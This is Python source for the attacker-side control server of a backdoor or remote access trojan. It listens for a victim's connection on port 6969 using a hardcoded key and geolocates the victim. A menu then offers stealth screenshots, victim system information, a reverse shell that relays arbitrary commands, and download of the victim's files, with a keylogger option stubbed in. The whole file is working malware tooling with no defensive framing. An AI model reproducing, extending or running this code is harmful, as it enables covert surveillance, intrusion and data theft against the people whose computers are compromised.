# -*- coding: utf-8 -*
import socket,os, platform, time, encrypted_connection, datetime, geolocalisation
HOST = '0.0.0.0' #Set as every ip address can connect to the server.
PORT = 6969
defaultPath = None
def consoleCleaner(enterToContinue): #When called, clear the console. If called with True argument, wait for enter to continue.
    if enterToContinue == True :
        try:
            input("Press enter to continue")
        except SyntaxError:
            pass
    if  platform.system() == "Windows" :
        os.system('cls')
    else :
        os.system('clear')
def welcomme(): #Message to welcomme the user,called once at the MAIN LOOP start.
    print("       ___         ___   ___         ___         ___   ___         ___         ___         ___  \r")
    print("|   | |     |     |     |   | |\ /| |             |   |   |       |           |   | |\  | |     \r")
    print("| + | |-+-  |     |     |   | | + | |-+-          +   |   |       |-+-        |   | | + | |-+-  \r")
    print("|/ \| |     |     |     |   | |   | |             |   |   |       |           |   | |  \| |     \r")
    print("       ---   ---   ---   ---         ---               ---                -    ---         ---  \r")
    print("                                                                                                ")
def menu(menu): #Contain the menus used in the main loop (Main or Keylooger).
    if (menu == "principale"):
        print("+----------------------+\n"
            "|         Menu         |\n"
            "+----------------------+\n"
            "| 1. Screen that beach |\n"
            "| 2. Os infos          |\n"
            "| 3. Reverse shell     |\n"
            "| 4. Expert Mode       |\n"
            "| 5. Exit              |\n"
            "+----------------------+")
 
def selection(menu,choix) : #Switch case, to dispatch menu possibilities.
    if menu == "principale" :
        if choix == "1" :
            print("Let's see that screen !")
            screenThatbeach()
            return True
        elif choix == "2" :
            print("Hum, let's discover !")
            print("\n\n" + OsVictimInfos + "\n\n")
            consoleCleaner(True)
            return True
        elif choix == "3" :
            print("Good choice, let's get in !")
            time.sleep(1)
            consoleCleaner(False)
            reverseShell(False, False)
            return True
        elif choix == "4" :
            print("Let's go deeper !")
            time.sleep(1)
            consoleCleaner(False)
            reverseShell(True, True)
            return True
        elif choix == "5" :
            print("\nSee you later !")
            encrypter.send_message_server("exit")
            time.sleep(1.5)
            consoleCleaner(False)
            return False
        else :
            print("Bad choice, try again !")
            time.sleep(1)
            consoleCleaner(False)
            return True
def KeyLogger(): #Keylogger menu -  If chosen, display the Keylogger menu and create a loop.
    exitKeyLogger = True
    while exitKeyLogger :
        menu("keylogger")
        exitKeyLogger = selection("keylogger",input(">"))
def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that interact with victim's pc.cat
    global defaultPath
    encrypter.send_message_server("cd "+ defaultPath)
    encrypter.receive_message_server()
    client_path = defaultPath
    while True:
        command = input(client_path+ " > ")
        if((command == "stb") & (screenThatbeachAcces == False)) :
            print("Acces forbidden")
        elif((command == "stb") & (screenThatbeachAcces == True)):
            print("taking the screenshot")
            screenThatbeach()
        elif("dl" in command):
            try :
                command_split = command.split()
                downloadFile(command_split[1])
            except :
                print("No file name !")
        elif((command == "keylogger") & (keyLogger == False)):
            print("Acces forbidden")    
        elif((command == "keylogger") & (keyLogger == True)):
            print("Not available now !")
            #client_socket.send(command.encode("utf-8"))
        elif(command == "state"):
            print(OsVictimInfos)
        elif(command == "home"):
            encrypter.send_message_server("cd "+ defaultPath)
            client_path = defaultPath
            encrypter.receive_message_server()
        elif(command == "clear"):
            consoleCleaner(False)
        elif(command == "quit"):
            consoleCleaner(False)
            break
        else :
            try:
                if(len(command.split()) != 0):
                    encrypter.send_message_server(command)
                    message = encrypter.receive_message_server()
                    if "Directory : " in str(message) :
                        try :
                            useless, client_path = message.split(" : ")
                        except :
                            print("No path has been sent.")
                    else :
                        print(message)
                else:
                    print("continue")
                    continue
            except(EOFError):
                    print("Invalid input, type 'help' to get a list of implemented commands.\n")
                    continue
def screenThatbeach(): #If chosen, take a stealth screenshot of the victim and save it in the .py executed path.
    encrypter.send_message_server("stb")
    captureName = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
    path = "captures"
    try :
        if encrypter.DownloadFile(path, captureName):
            print("Download sucessful.")
            os.system("qlmanage -p " + path + "/"+ captureName + ">/dev/null 2>&1" )
            consoleCleaner(False)
        else :
            print("You do not have permissions to create a file there.")
    except :
        print("Problem in definition.")
        consoleCleaner(True)
def downloadFile(fileName : str):
    encrypter.send_message_server("dl "+ fileName)
    path = "downloaded_files"
    try :
        if encrypter.DownloadFile(path, fileName):
            print("Download sucessful.")
            os.system("qlmanage -p " + path + "/"+ fileName + ">/dev/null 2>&1" )
            consoleCleaner(False)
        else :
            print("The file you want to download doesn't exist !")
    except :
        print("Problem in definition.")
        consoleCleaner(True)
def parser(tupleArray : tuple):
    global defaultPath
    tupleArray = tupleArray.split("\n")
    useless, arg = tupleArray[3].split(" : ")
    useless, defaultPath = tupleArray[4].split(" : ")
    return arg

    
        
# STARTING MAIN LOOP.
#Calling the function to set the secret key
encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
#Calling the function to create the TCP server with specified PORT & HOST.
client_ip = encrypter.initialize_tcp_connexion_server(HOST,PORT)
#victimLocalisation = GetLocalisation(client_ip)
victimLocalisation = geolocalisation.GeoLocalisation(client_ip).locate()
consoleCleaner(False)
#Getting victim's os infos.
OsVictimInfos = encrypter.receive_message_server()
user = parser(OsVictimInfos)
#print(encrypter.decrypt(OsVictimInfos))

#Create a variable that is used to exit from the loop.
exitBackDoorLoop = True
if OsVictimInfos == "exit":
    exitBackDoorLoop = False

#Show the banner.
#Starting the main loop and waiting for exitBackDoorLoop to change to False.
while exitBackDoorLoop :
    welcomme()
    print("[*] " + user + " connected from " + client_ip + "\n")
    print("[*] Localisation : "+ victimLocalisation +"\n")
    print("[*] Default path : "+ defaultPath +"\n")
    menu("principale")
    exitBackDoorLoop = selection("principale",input(">"))
encrypter.close_tcp_connexion_server()